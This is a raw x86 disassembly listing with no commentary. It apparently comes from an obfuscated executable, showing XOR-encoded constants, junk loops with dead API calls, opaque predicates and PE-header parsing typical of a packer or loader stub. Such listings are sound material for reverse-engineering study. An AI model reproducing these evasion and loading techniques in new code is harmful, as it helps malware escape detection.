  401cdb:	pop    ecx
  401cdc:	sub    ecx,eax
  401cde:	add    ecx,DWORD PTR [ebp-0x1c]
  401ce1:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401ce8:	mov    DWORD PTR [ebp+0x10],ecx
  401ceb:	mov    DWORD PTR [ebp-0xcc],ebx
  401cf1:	mov    eax,DWORD PTR [ebp+0xc]
  401cf4:	mov    DWORD PTR [ebp-0xc8],eax
  401cfa:	mov    eax,DWORD PTR [ebp+0x10]
  401cfd:	mov    DWORD PTR [ebp-0xc4],eax
  401d03:	mov    eax,DWORD PTR [ebp-0x2c]
  401d06:	xor    eax,esi
  401d08:	add    eax,edi
  401d0a:	mov    DWORD PTR [ebp-0xc0],eax
  401d10:	lea    eax,[ebp-0x78]
  401d13:	mov    DWORD PTR [ebp-0xbc],eax
  401d19:	mov    eax,DWORD PTR [ebp-0xcc]
  401d1f:	xor    eax,esi
  401d21:	add    eax,edi
  401d23:	mov    DWORD PTR [ebp-0xcc],eax
  401d29:	lea    eax,[ebp-0xcc]
  401d2f:	push   eax
  401d30:	mov    eax,DWORD PTR [ebp-0x3c]
  401d33:	xor    eax,esi
  401d35:	add    eax,edi
  401d37:	push   eax
  401d38:	mov    eax,ds:0x424455
  401d3d:	push   0x4243ab
  401d42:	push   DWORD PTR [eax]
  401d44:	call   0x402470
  401d49:	mov    eax,DWORD PTR [ebp+0xc]
  401d4c:	mov    ecx,DWORD PTR [ebp+0x10]
  401d4f:	mov    DWORD PTR [ebp-0x6c],ecx
  401d52:	mov    ecx,DWORD PTR [ebp-0x18]
  401d55:	xor    ecx,esi
  401d57:	mov    DWORD PTR [ebp-0x1c],eax
  401d5a:	add    ecx,edi
  401d5c:	jmp    0x401f02
  401d61:	lea    edx,[ecx+eax*1]
  401d64:	mov    DWORD PTR [ebp+0x10],edx
  401d67:	mov    edx,DWORD PTR [ebp-0x6c]
  401d6a:	sub    edx,ecx
  401d6c:	mov    DWORD PTR [ebp+0xc],edx
  401d6f:	mov    edx,DWORD PTR [ebp+0xc]
  401d72:	mov    DWORD PTR [ebp-0x44],edx
  401d75:	mov    edx,DWORD PTR [ebp+0x10]
  401d78:	mov    DWORD PTR [ebp-0x40],0xf89c85b5
  401d7f:	mov    DWORD PTR [ebp-0x64],edx
  401d82:	mov    DWORD PTR [ebp+0x10],0xf89c85b2
  401d89:	mov    edx,DWORD PTR [ebp-0x40]
  401d8c:	xor    edx,esi
  401d8e:	add    edx,edi
  401d90:	mov    DWORD PTR [ebp+0xc],edx
  401d93:	mov    edx,DWORD PTR [ebp-0x40]
  401d96:	xor    edx,esi
  401d98:	add    edx,edi
  401d9a:	mov    DWORD PTR [ebp-0x4],edx
  401d9d:	mov    DWORD PTR [ebp-0x60],0xf89c85d5
  401da4:	mov    DWORD PTR [ebp-0x5c],0xf89c85bc
  401dab:	mov    edx,DWORD PTR [ebp-0x40]
  401dae:	mov    ebx,DWORD PTR [ebp-0x44]
  401db1:	xor    edx,esi
  401db3:	add    edx,edi
  401db5:	cmp    ebx,edx
  401db7:	je     0x401ef6
  401dbd:	mov    eax,DWORD PTR [ebp+0x10]
  401dc0:	xor    eax,esi
  401dc2:	mov    edx,0xffcd8d23
  401dc7:	sub    edx,eax
  401dc9:	add    edx,DWORD PTR [ebp-0x44]
  401dcc:	mov    eax,DWORD PTR [ebp+0x10]
  401dcf:	mov    ebx,DWORD PTR [ebp+0xc]
  401dd2:	xor    eax,esi
  401dd4:	add    eax,edi
  401dd6:	imul   eax,ebx
  401dd9:	cmp    eax,edx
  401ddb:	ja     0x401ef3
  401de1:	mov    edx,DWORD PTR [ebp+0xc]
  401de4:	mov    eax,DWORD PTR [ebp-0x44]
  401de7:	mov    ebx,DWORD PTR [ebp-0x60]
  401dea:	sub    eax,edx
  401dec:	xor    ebx,esi
  401dee:	xor    edx,edx
  401df0:	add    ebx,edi
  401df2:	div    ebx
  401df4:	mov    DWORD PTR [ebp-0x4],eax
  401df7:	mov    eax,DWORD PTR [ebp-0x5c]
  401dfa:	mov    edx,DWORD PTR [ebp-0x4]
  401dfd:	xor    eax,esi
  401dff:	add    eax,edi
  401e01:	cmp    edx,eax
  401e03:	jbe    0x401e13
  401e09:	mov    eax,DWORD PTR [ebp-0x5c]
  401e0c:	xor    eax,esi
  401e0e:	add    eax,edi
  401e10:	mov    DWORD PTR [ebp-0x4],eax
  401e13:	mov    eax,DWORD PTR [ebp-0x60]
  401e16:	mov    edx,DWORD PTR [ebp-0x4]
  401e19:	xor    eax,esi
  401e1b:	add    eax,edi
  401e1d:	imul   eax,edx
  401e20:	mov    DWORD PTR [ebp-0x4],eax
  401e23:	mov    eax,DWORD PTR [ebp-0x40]
  401e26:	mov    edx,DWORD PTR [ebp-0x4]
  401e29:	xor    eax,esi
  401e2b:	add    eax,edi
  401e2d:	cmp    edx,eax
  401e2f:	je     0x401edc
  401e35:	mov    eax,DWORD PTR [ebp-0x4]
  401e38:	mov    DWORD PTR [ebp-0x24],eax
  401e3b:	mov    eax,DWORD PTR [ebp+0xc]
  401e3e:	add    eax,DWORD PTR [ebp-0x64]
  401e41:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  401e48:	mov    DWORD PTR [ebp-0x48],eax
  401e4b:	mov    eax,0xf89c85b2
  401e50:	mov    DWORD PTR [ebp-0x50],eax
  401e53:	mov    DWORD PTR [ebp-0x10],0xf89c85b3
  401e5a:	mov    DWORD PTR [ebp-0x10],0xf89c85b0
  401e61:	mov    DWORD PTR [ebp-0x54],eax
  401e64:	mov    eax,DWORD PTR [ebp-0x2c]
  401e67:	xor    eax,esi
  401e69:	add    eax,edi
  401e6b:	jmp    0x401e98
  401e70:	mov    eax,DWORD PTR [ebp-0x54]
  401e73:	mov    edx,DWORD PTR [ebp-0x4]
  401e76:	xor    eax,esi
  401e78:	add    eax,edi
  401e7a:	imul   eax,edx
  401e7d:	mov    edx,DWORD PTR [ebp-0x48]
  401e80:	mov    BYTE PTR [eax+edx*1],0x0
  401e84:	mov    eax,DWORD PTR [ebp-0x10]
  401e87:	mov    edx,DWORD PTR [ebp-0x50]
  401e8a:	xor    eax,esi
  401e8c:	xor    edx,esi
  401e8e:	add    eax,edi
  401e90:	add    edx,edi
  401e92:	imul   eax,edx
  401e95:	add    eax,DWORD PTR [ebp-0x4]
  401e98:	mov    DWORD PTR [ebp-0x4],eax
  401e9b:	mov    eax,DWORD PTR [ebp-0x4]
  401e9e:	mov    edx,DWORD PTR [ebp-0x24]
  401ea1:	cmp    edx,eax
  401ea3:	jb     0x401e70
  401ea9:	mov    eax,DWORD PTR [ebp-0x50]
  401eac:	mov    edx,DWORD PTR [ebp-0x24]
  401eaf:	xor    eax,esi
  401eb1:	add    eax,edi
  401eb3:	imul   eax,edx
  401eb6:	mov    edx,DWORD PTR [ebp-0x2c]
  401eb9:	xor    edx,esi
  401ebb:	add    edx,edi
  401ebd:	or     eax,edx
  401ebf:	mov    edx,DWORD PTR [ebp+0x10]
  401ec2:	xor    edx,esi
  401ec4:	add    eax,edx
  401ec6:	mov    edx,DWORD PTR [ebp+0x10]
  401ec9:	xor    edx,esi
  401ecb:	add    eax,edx
  401ecd:	mov    edx,DWORD PTR [ebp+0xc]
  401ed0:	lea    eax,[eax+edx*1+0x64e5ba]
  401ed7:	jmp    0x401eeb
  401edc:	mov    eax,DWORD PTR [ebp+0x10]
  401edf:	mov    edx,DWORD PTR [ebp+0xc]
  401ee2:	xor    eax,esi
  401ee4:	lea    eax,[eax+edx*1+0x3272dd]
  401eeb:	mov    DWORD PTR [ebp+0xc],eax
  401eee:	jmp    0x401dbd
  401ef3:	mov    eax,DWORD PTR [ebp-0x1c]
  401ef6:	mov    edx,DWORD PTR [ebp-0x3c]
  401ef9:	xor    edx,esi
  401efb:	lea    ecx,[ecx+edx*1+0x3272dd]
  401f02:	lea    edx,[ecx-0x3272dd]
  401f08:	xor    edx,esi
  401f0a:	cmp    edx,0xf89c95b5
  401f10:	jne    0x401d61
  401f16:	mov    ecx,DWORD PTR [ebp-0x18]
  401f19:	mov    edx,DWORD PTR [ebp-0x3c]
  401f1c:	mov    ebx,DWORD PTR [ebp-0x18]
  401f1f:	xor    edx,esi
  401f21:	mov    dl,BYTE PTR [edx+eax*1+0x3272dd]
  401f28:	xor    ecx,esi
  401f2a:	mov    cl,BYTE PTR [ecx+eax*1+0x3272dd]
  401f31:	xor    ebx,esi
  401f33:	mov    BYTE PTR [ebx+eax*1+0x3272dd],dl
  401f3a:	mov    edx,DWORD PTR [ebp-0x3c]
  401f3d:	xor    edx,esi
  401f3f:	mov    BYTE PTR [edx+eax*1+0x3272dd],cl
  401f46:	mov    eax,DWORD PTR [ebp-0x3c]
  401f49:	mov    eax,DWORD PTR [ebp-0x8]
  401f4c:	xor    eax,esi
  401f4e:	add    eax,edi
  401f50:	mov    ds:0x4244b9,eax
  401f55:	mov    eax,DWORD PTR [ebp-0x8]
  401f58:	xor    eax,esi
  401f5a:	add    eax,edi
  401f5c:	mov    ds:0x4244b1,eax
  401f61:	lea    eax,[ebp-0x28]
  401f64:	mov    DWORD PTR [ebp-0x88],eax
  401f6a:	lea    eax,[ebp+0x4]
  401f6d:	mov    DWORD PTR [ebp-0x28],eax
  401f70:	mov    eax,DWORD PTR [ebp-0x28]
  401f73:	test   eax,eax
  401f75:	je     0x40209d
  401f7b:	mov    DWORD PTR [ebp-0x80],0xf152c3a
  401f82:	mov    DWORD PTR [ebp-0x74],0x712ed0f
  401f89:	mov    DWORD PTR [ebp-0x7c],0x373fc2d
  401f90:	mov    DWORD PTR [ebp-0x84],0x72670a1d
  401f9a:	call   0x407339
  401f9f:	mov    eax,DWORD PTR [ebp-0x20]
  401fa2:	mov    eax,DWORD PTR [ebp-0xc]
  401fa5:	mov    eax,DWORD PTR [ebp-0x8]
  401fa8:	mov    DWORD PTR [ebp+0xc],eax
  401fab:	mov    eax,eax
  401fad:	mov    eax,ds:0x424435
  401fb2:	mov    eax,DWORD PTR [eax+0x1c8]
  401fb8:	mov    eax,DWORD PTR [eax]
  401fba:	cdq    
  401fbb:	mov    ebx,eax
  401fbd:	mov    eax,0xfabdbeed
  401fc2:	add    ebx,eax
  401fc4:	adc    edx,0xffffffff
  401fc7:	and    DWORD PTR [ebp-0x10],0x0
  401fcb:	xor    edx,0x0
  401fce:	mov    DWORD PTR [ebp-0x54],edx
  401fd1:	mov    edx,DWORD PTR [ebp+0xc]
  401fd4:	mov    DWORD PTR [ebp-0x14],edx
  401fd7:	mov    ecx,0x8a29a127
  401fdc:	xor    ebx,ecx
  401fde:	add    DWORD PTR [ebp-0x14],eax
  401fe1:	mov    edx,DWORD PTR [ebp-0x14]
  401fe4:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401fe8:	xor    edx,ecx
  401fea:	mov    DWORD PTR [ebp-0x4c],edx
  401fed:	mov    edx,DWORD PTR [ebp-0x10]
  401ff0:	xor    edx,0x0
  401ff3:	mov    DWORD PTR [ebp-0x48],edx
  401ff6:	cmp    DWORD PTR [ebp-0x4c],ebx
  401ff9:	jne    0x40200b
  401fff:	mov    edx,DWORD PTR [ebp-0x54]
  402002:	cmp    DWORD PTR [ebp-0x48],edx
  402005:	je     0x40203a
  40200b:	mov    edx,DWORD PTR ds:0x424435
  402011:	mov    edx,DWORD PTR [edx+0x1c0]
  402017:	mov    edx,DWORD PTR [edx]
  402019:	xor    ebx,ebx
  40201b:	add    edx,eax
  40201d:	adc    ebx,0xffffffff
  402020:	xor    edx,ecx
  402022:	xor    ebx,0x0
  402025:	cmp    edx,0x70941fc9
  40202b:	jne    0x40209d
  402031:	cmp    ebx,0xffffffff
  402034:	jne    0x40209d
  40203a:	mov    edx,DWORD PTR ds:0x4244b1
  402040:	mov    ebx,DWORD PTR ds:0x4244b9
  402046:	xor    edx,ebx
  402048:	mov    DWORD PTR ds:0x4244b1,edx
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    ebx,DWORD PTR ds:0x4244b1
  402057:	add    ebx,DWORD PTR [edx]
  402059:	mov    edx,DWORD PTR [ebp-0x28]
  40205c:	mov    DWORD PTR [edx],ebx
  40205e:	mov    edx,DWORD PTR [ebp+0xc]
  402061:	xor    esi,edx
  402063:	mov    edx,DWORD PTR ds:0x4244b1
  402069:	add    esi,edi
  40206b:	xor    ebx,ebx
  40206d:	add    esi,eax
  40206f:	adc    ebx,0xffffffff
  402072:	xor    edi,edi
  402074:	xor    esi,ecx
  402076:	xor    ebx,0x0
  402079:	add    edx,eax
  40207b:	adc    edi,0xffffffff
  40207e:	xor    edx,ecx
  402080:	xor    edi,0x0
  402083:	cmp    edx,esi
  402085:	jne    0x40209d
  40208b:	cmp    edi,ebx
  40208d:	jne    0x40209d
  402093:	mov    eax,ds:0x4244b1
  402098:	mov    ds:0x4244b9,eax
  40209d:	mov    eax,ds:0x424435
  4020a2:	push   0x4
  4020a4:	add    eax,0x1cc
  4020a9:	push   eax
  4020aa:	lea    eax,[ebp-0x20]
  4020ad:	push   eax
  4020ae:	call   0x4020cd
  4020b3:	mov    eax,DWORD PTR [ebp-0x20]
  4020b6:	mov    eax,DWORD PTR [eax]
  4020b8:	pop    ebx
  4020b9:	pop    esi
  4020ba:	pop    edi
  4020bb:	leave  
  4020bc:	ret    0xc
  4020bf:	xor    eax,eax
  4020c1:	and    DWORD PTR ds:0x420f60,0x42200c
  4020cb:	inc    eax
  4020cc:	ret    
  4020cd:	push   ebp
  4020ce:	mov    ebp,esp
  4020d0:	sub    esp,0x10
  4020d3:	and    DWORD PTR ds:0x420e96,0x0
  4020dd:	mov    edx,DWORD PTR ds:0x420e96
  4020e3:	inc    edx
  4020e4:	mov    DWORD PTR ds:0x420e96,edx
  4020ea:	cmp    DWORD PTR ds:0x420e96,0xc
  4020f1:	jne    0x4020fd
  4020f7:	call   DWORD PTR ds:0x4247f1
  4020fd:	cmp    DWORD PTR ds:0x420e96,0xb
  402104:	jne    0x402117
  40210a:	mov    edx,DWORD PTR ds:0x420e96
  402110:	inc    edx
  402111:	mov    DWORD PTR ds:0x420e96,edx
  402117:	cmp    DWORD PTR ds:0x420e96,0x1e
  40211e:	jb     0x4020dd
  402124:	mov    DWORD PTR ds:0x422000,0x1a
  40212e:	cmp    DWORD PTR ds:0x422000,0x0
  402135:	je     0x40216d
  40213b:	cmp    DWORD PTR ds:0x422000,0x23
  402142:	jne    0x40214e
  402148:	call   DWORD PTR ds:0x4247f5
  40214e:	mov    ecx,DWORD PTR ds:0x422000
  402154:	dec    ecx
  402155:	mov    DWORD PTR ds:0x422000,ecx
  40215b:	jmp    0x40212e
  402160:	movzx  ecx,BYTE PTR ds:0x420f6c
  402167:	sbb    DWORD PTR ds:0x420ef4,ecx
  40216d:	mov    eax,0xf89c85b5
  402172:	and    DWORD PTR ds:0x422008,0x1b79
  40217c:	mov    DWORD PTR [ebp-0x4],eax
  40217f:	mov    ecx,DWORD PTR ds:0x420f60
  402185:	sub    ecx,DWORD PTR ds:0x420eec
  40218b:	mov    DWORD PTR ds:0x420f60,ecx
  402191:	mov    DWORD PTR [ebp-0x8],0xf89c85b2
  402198:	mov    ecx,DWORD PTR [ebp-0x4]
  40219b:	and    DWORD PTR ds:0x420f08,0x0
  4021a5:	mov    edx,DWORD PTR ds:0x420f08
  4021ab:	inc    edx
  4021ac:	mov    DWORD PTR ds:0x420f08,edx
  4021b2:	cmp    DWORD PTR ds:0x420f08,0x27
  4021b9:	jne    0x4021e8
  4021bf:	push   0x88c3
  4021c4:	push   0x163c
  4021c9:	push   0x420ef4
  4021ce:	push   0x4bad
  4021d3:	push   0x581a
  4021d8:	push   0x60bf
  4021dd:	push   0x312d
  4021e2:	call   DWORD PTR ds:0x4247f9
  4021e8:	cmp    DWORD PTR ds:0x420f08,0x1e
  4021ef:	jb     0x4021a5
  4021f5:	push   esi
  4021f6:	mov    edx,0x7510896
  4021fb:	xor    ecx,edx
  4021fd:	mov    DWORD PTR ds:0x420f74,0x11
  402207:	cmp    DWORD PTR ds:0x420f74,0x0
  40220e:	je     0x402263
  402214:	cmp    DWORD PTR ds:0x420f74,0x7
  40221b:	jne    0x402231
  402221:	push   0x19b5
  402226:	push   0x424000
  40222b:	call   DWORD PTR ds:0x4247fd
  402231:	cmp    DWORD PTR ds:0x420f74,0x8
  402238:	jne    0x40224b
  40223e:	mov    esi,DWORD PTR ds:0x420f74
  402244:	dec    esi
  402245:	mov    DWORD PTR ds:0x420f74,esi
  40224b:	mov    esi,DWORD PTR ds:0x420f74
  402251:	dec    esi
  402252:	mov    DWORD PTR ds:0x420f74,esi
  402258:	jmp    0x402207
  40225d:	and    esi,0x2f21
  402263:	mov    esi,0x3272dd
  402268:	push   edi
  402269:	mov    edi,DWORD PTR [ebp+0x10]
  40226c:	add    ecx,esi
  40226e:	cmp    ecx,edi
  402270:	je     0x402335
  402276:	mov    ecx,DWORD PTR [ebp-0x4]
  402279:	mov    edi,DWORD PTR [ebp+0x10]
  40227c:	xor    eax,eax
  40227e:	xor    ecx,edx
  402280:	add    ecx,esi
  402282:	add    edi,0xfabdbeed
  402288:	adc    eax,0xffffffff
  40228b:	xor    eax,0x0
  40228e:	mov    DWORD PTR [ebp-0xc],eax
  402291:	push   ebx
  402292:	xor    ebx,ebx
  402294:	xor    edi,0x8a29a127
  40229a:	mov    eax,ecx
  40229c:	add    eax,0xfabdbeed
  4022a1:	adc    ebx,0xffffffff
  4022a4:	xor    eax,0x8a29a127
  4022a9:	xor    ebx,0x0
  4022ac:	cmp    eax,edi
  4022ae:	jne    0x4022c7
  4022b4:	cmp    ebx,DWORD PTR [ebp-0xc]
  4022b7:	je     0x40232f
  4022bd:	jmp    0x4022c7
  4022c2:	mov    esi,0x3272dd
  4022c7:	mov    eax,DWORD PTR [ebp-0x4]
  4022ca:	mov    edi,DWORD PTR [ebp-0x8]
  4022cd:	xor    edi,edx
  4022cf:	add    edi,esi
  4022d1:	mov    esi,DWORD PTR [ebp+0x8]
  4022d4:	imul   edi,ecx
  4022d7:	mov    ebx,DWORD PTR [ebp+0xc]
  4022da:	xor    eax,edx
  4022dc:	add    eax,ecx
  4022de:	mov    al,BYTE PTR [ebx+eax*1+0x3272dd]
  4022e5:	mov    BYTE PTR [edi+esi*1],al
  4022e8:	mov    eax,DWORD PTR [ebp-0x8]
  4022eb:	mov    esi,DWORD PTR [ebp+0x10]
  4022ee:	xor    eax,edx
  4022f0:	xor    ebx,ebx
  4022f2:	add    esi,0xfabdbeed
  4022f8:	adc    ebx,0xffffffff
  4022fb:	lea    ecx,[ecx+eax*1+0x3272dd]
  402302:	xor    edi,edi
  402304:	xor    esi,0x8a29a127
  40230a:	xor    ebx,0x0
  40230d:	mov    eax,ecx
  40230f:	add    eax,0xfabdbeed
  402314:	adc    edi,0xffffffff
  402317:	xor    eax,0x8a29a127
  40231c:	xor    edi,0x0
  40231f:	cmp    eax,esi
  402321:	jne    0x4022c2
  402327:	cmp    edi,ebx
  402329:	jne    0x4022c2
  40232f:	mov    eax,0xf89c85b2
  402334:	pop    ebx
  402335:	pop    edi
  402336:	pop    esi
  402337:	leave  
  402338:	ret    0xc
  40233b:	push   ebp
  40233c:	mov    ebp,esp
  40233e:	push   ecx
  40233f:	and    eax,0x3e6
  402344:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  40234b:	adc    DWORD PTR ds:0x420e96,ecx
  402351:	mov    eax,DWORD PTR [ebp+0x8]
  402354:	add    DWORD PTR ds:0x420e8e,0x7faa
  40235e:	mov    al,BYTE PTR [eax]
  402360:	add    al,0xb
  402362:	adc    DWORD PTR ds:0x420f74,0x420fac
  40236c:	xor    al,0x71
  40236e:	mov    DWORD PTR ds:0x420f60,0x413c
  402378:	cmp    al,0x29
  40237a:	mov    DWORD PTR ds:0x420f98,0x418e
  402384:	jne    0x40245f
  40238a:	mov    DWORD PTR ds:0x420fb0,0x17
  402394:	cmp    DWORD PTR ds:0x420fb0,0x0
  40239b:	je     0x4023d3
  4023a1:	cmp    DWORD PTR ds:0x420fb0,0x18
  4023a8:	jne    0x4023c1
  4023ae:	push   0x424238
  4023b3:	push   0x0
  4023b5:	push   DWORD PTR [ebp-0x14]
  4023b8:	push   DWORD PTR [ebp-0x14]
  4023bb:	call   DWORD PTR ds:0x424801
  4023c1:	mov    edx,DWORD PTR ds:0x420fb0
  4023c7:	dec    edx
  4023c8:	mov    DWORD PTR ds:0x420fb0,edx
  4023ce:	jmp    0x402394
  4023d3:	mov    eax,DWORD PTR [ebp+0x8]
  4023d6:	and    DWORD PTR ds:0x420f00,0x0
  4023e0:	jmp    0x4023f4
  4023e5:	xor    edx,edx
  4023e7:	or     edx,DWORD PTR ds:0x420f00
  4023ed:	inc    edx
  4023ee:	mov    DWORD PTR ds:0x420f00,edx
  4023f4:	cmp    DWORD PTR ds:0x420f00,0x10
  4023fb:	jae    0x402423
  402401:	cmp    DWORD PTR ds:0x420f00,0x16
  402408:	jne    0x40241e
  40240e:	push   0x420e8a
  402413:	push   0x8874
  402418:	call   DWORD PTR ds:0x424805
  40241e:	jmp    0x4023e5
  402423:	mov    ecx,DWORD PTR [ebp+0x8]
  402426:	add    ecx,DWORD PTR [eax+0x3c]
  402429:	mov    edx,0x7510896
  40242e:	mov    DWORD PTR [ebp+0x8],ecx
  402431:	mov    eax,DWORD PTR [ebp-0x4]
  402434:	xor    eax,edx
  402436:	push   esi
  402437:	mov    esi,DWORD PTR [ebp+0x8]
  40243a:	mov    ecx,0x3272dd
  40243f:	add    eax,ecx
  402441:	cmp    DWORD PTR [esi+0x54],eax
  402444:	pop    esi
  402445:	je     0x402453
  40244b:	mov    eax,DWORD PTR [ebp+0x8]
  40244e:	jmp    0x40246c
  402453:	mov    eax,DWORD PTR [ebp-0x4]
  402456:	xor    eax,edx
  402458:	add    eax,ecx
  40245a:	jmp    0x40246c
  40245f:	mov    eax,DWORD PTR [ebp-0x4]
  402462:	xor    eax,0x7510896
  402467:	add    eax,0x3272dd
  40246c:	leave  
  40246d:	ret    0x4
  402470:	push   ebp
  402471:	mov    ebp,esp
  402473:	sub    esp,0x78
  402476:	push   ebx
  402477:	add    DWORD PTR ds:0x420f74,0x422014
  402481:	push   esi
  402482:	adc    DWORD PTR ds:0x422008,0x3845
  40248c:	push   edi
  40248d:	adc    DWORD PTR ds:0x420f6c,0x5918
  402497:	push   0x1f
  402499:	lea    eax,[ebp-0x78]
  40249c:	or     DWORD PTR ds:0x420f5c,0x420f98
  4024a6:	push   eax
  4024a7:	push   0x0
  4024a9:	sub    DWORD PTR ds:0x420efc,0x7a9b
  4024b3:	call   DWORD PTR ds:0x424809
  4024b9:	push   0x97898797
  4024be:	call   DWORD PTR ds:0x4247cd
  4024c4:	and    ebx,eax
  4024c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4024cd:	and    DWORD PTR ds:0x420e8e,0x0
  4024d7:	mov    ecx,DWORD PTR ds:0x420e8e
  4024dd:	inc    ecx
  4024de:	mov    DWORD PTR ds:0x420e8e,ecx
  4024e4:	cmp    DWORD PTR ds:0x420e8e,0xc
  4024eb:	jne    0x402513
  4024f1:	push   DWORD PTR [ebp-0x18]
  4024f4:	push   0x420ef0
  4024f9:	push   0x1a2a
  4024fe:	push   0x4240c5
  402503:	push   0x11f1
  402508:	push   0x79a7
  40250d:	call   DWORD PTR ds:0x42480d
  402513:	cmp    DWORD PTR ds:0x420e8e,0xb
  40251a:	jne    0x40252d
  402520:	mov    ecx,DWORD PTR ds:0x420e8e
  402526:	inc    ecx
  402527:	mov    DWORD PTR ds:0x420e8e,ecx
  40252d:	cmp    DWORD PTR ds:0x420e8e,0x1f
  402534:	jb     0x4024d7
  40253a:	mov    DWORD PTR ds:0x420e92,0x15
  402544:	cmp    DWORD PTR ds:0x420e92,0x0
  40254b:	je     0x40258c
  402551:	cmp    DWORD PTR ds:0x420e92,0x4
  402558:	jne    0x402564
  40255e:	call   DWORD PTR ds:0x424811
  402564:	cmp    DWORD PTR ds:0x420e92,0x5
  40256b:	jne    0x40257c
  402571:	mov    eax,ds:0x420e92
  402576:	dec    eax
  402577:	mov    ds:0x420e92,eax
  40257c:	mov    eax,ds:0x420e92
  402581:	dec    eax
  402582:	mov    ds:0x420e92,eax
  402587:	jmp    0x402544
  40258c:	mov    DWORD PTR [ebp-0x14],0xf89c85b2
  402593:	mov    ecx,DWORD PTR [ebp-0x4]
  402596:	and    DWORD PTR ds:0x420f00,0x0
  4025a0:	xor    eax,eax
  4025a2:	add    eax,DWORD PTR ds:0x420f00
  4025a8:	inc    eax
  4025a9:	mov    ds:0x420f00,eax
  4025ae:	cmp    DWORD PTR ds:0x420f00,0x1d
  4025b5:	jne    0x4025c6
  4025bb:	push   0x420e82
  4025c0:	call   DWORD PTR ds:0x424815
  4025c6:	cmp    DWORD PTR ds:0x420f00,0x1a
  4025cd:	jb     0x4025a0
  4025d3:	mov    ebx,DWORD PTR ds:0x420f9c
  4025d9:	sbb    DWORD PTR ds:0x420f58,ebx
  4025df:	mov    ebx,0x7510896
  4025e4:	xor    ecx,ebx
  4025e6:	mov    eax,ds:0x420e82
  4025eb:	or     eax,DWORD PTR ds:0x420e7a
  4025f1:	mov    ds:0x420e82,eax
  4025f6:	mov    eax,0x3272dd
  4025fb:	dec    DWORD PTR ds:0x420fa0
  402601:	add    ecx,eax
  402603:	and    DWORD PTR ds:0x420e9e,0x420e8a
  40260d:	mov    DWORD PTR [ebp-0x1c],ecx
  402610:	xor    ecx,ecx
  402612:	xor    ecx,DWORD PTR ds:0x422014
  402618:	adc    DWORD PTR ds:0x420ef4,ecx
  40261e:	mov    ecx,DWORD PTR [ebp+0x14]
  402621:	test   ecx,ecx
  402623:	mov    DWORD PTR ds:0x420e96,0x3634
  40262d:	je     0x40263f
  402633:	sub    ecx,esi
  402635:	mov    ecx,DWORD PTR [ebp+0x14]
  402638:	mov    ecx,DWORD PTR [ecx]
  40263a:	or     edi,edi
  40263c:	mov    DWORD PTR [ebp-0x1c],ecx
  40263f:	and    DWORD PTR ds:0x422010,0x634e
  402649:	mov    ecx,0x7665
  40264e:	imul   edx,eax
  402651:	or     DWORD PTR ds:0x422000,0x5329
  40265b:	mov    esi,0x76532
  402660:	add    edx,ecx
  402662:	xchg   esi,ecx
  402664:	mov    edi,0x54354
  402669:	or     DWORD PTR ds:0x420fa4,0x820
  402673:	sub    edx,edi
  402675:	mov    esi,DWORD PTR ds:0x420ea6
  40267b:	mov    esi,DWORD PTR [esi]
  40267d:	or     DWORD PTR ds:0x420e9a,esi
  402683:	mov    ecx,DWORD PTR [ebp-0x4]
  402686:	mov    DWORD PTR ds:0x420fac,0x1c
  402690:	cmp    DWORD PTR ds:0x420fac,0x0
  402697:	je     0x4026e4
  40269d:	cmp    DWORD PTR ds:0x420fac,0x4
  4026a4:	jne    0x4026b8
  4026aa:	push   DWORD PTR [ebp-0x18]
  4026ad:	push   0x676d
  4026b2:	call   DWORD PTR ds:0x4247d5
  4026b8:	cmp    DWORD PTR ds:0x420fac,0x5
  4026bf:	jne    0x4026d2
  4026c5:	mov    esi,DWORD PTR ds:0x420fac
  4026cb:	dec    esi
  4026cc:	mov    DWORD PTR ds:0x420fac,esi
  4026d2:	mov    esi,DWORD PTR ds:0x420fac
  4026d8:	dec    esi
  4026d9:	mov    DWORD PTR ds:0x420fac,esi
  4026df:	jmp    0x402690
  4026e4:	xor    ecx,ebx
  4026e6:	add    ecx,eax
  4026e8:	mov    DWORD PTR [ebp-0x8],ecx
  4026eb:	sbb    esi,DWORD PTR ds:0x420e9a
  4026f1:	mov    ecx,DWORD PTR [ebp-0x14]
  4026f4:	xor    ecx,ebx
  4026f6:	or     DWORD PTR ds:0x420fb0,edi
  4026fc:	add    ecx,eax
  4026fe:	or     DWORD PTR ds:0x420f60,0xf49
  402708:	mov    DWORD PTR [ebp-0x24],ecx
  40270b:	mov    DWORD PTR ds:0x420fa8,0x17
  402715:	cmp    DWORD PTR ds:0x420fa8,0x0
  40271c:	je     0x402758
  402722:	cmp    DWORD PTR ds:0x420fa8,0x22
  402729:	jne    0x402740
  40272f:	push   DWORD PTR [ebp-0x20]
  402732:	push   0x420f04
  402737:	push   DWORD PTR [ebp-0x18]
  40273a:	call   DWORD PTR ds:0x4247d9
  402740:	mov    esi,DWORD PTR ds:0x420fa8
  402746:	dec    esi
  402747:	mov    DWORD PTR ds:0x420fa8,esi
  40274d:	jmp    0x402715
  402752:	sub    ecx,DWORD PTR ds:0x420e9a
  402758:	mov    ecx,DWORD PTR [ebp-0x4]
  40275b:	mov    esi,DWORD PTR ds:0x420e8a
  402761:	xor    DWORD PTR ds:0x420f64,esi
  402767:	xor    ecx,ebx
  402769:	add    ecx,eax
  40276b:	mov    esi,DWORD PTR ds:0x420e82
  402771:	sbb    DWORD PTR ds:0x420f08,esi
  402777:	mov    DWORD PTR [ebp-0x30],ecx
  40277a:	mov    esi,DWORD PTR [ebp-0x4]
  40277d:	xor    esi,ebx
  40277f:	adc    ecx,DWORD PTR ds:0x420e92
  402785:	add    esi,eax
  402787:	mov    ecx,DWORD PTR [ebp-0x24]
  40278a:	sub    ecx,eax
  40278c:	mov    DWORD PTR ds:0x420ef8,0x1fac
  402796:	lea    edx,[esi-0x3272dd]
  40279c:	or     DWORD PTR ds:0x422000,0x620f
  4027a6:	xor    ecx,ebx
  4027a8:	sub    DWORD PTR ds:0x420f74,0x420ef4
  4027b2:	xor    edx,ebx
  4027b4:	cmp    edx,ecx
  4027b6:	mov    DWORD PTR ds:0x422010,0x61b1
  4027c0:	je     0x404db6
  4027c6:	mov    ecx,DWORD PTR [ebp-0x4]
  4027c9:	and    DWORD PTR ds:0x420f64,0x54e0
  4027d3:	xor    ecx,ebx
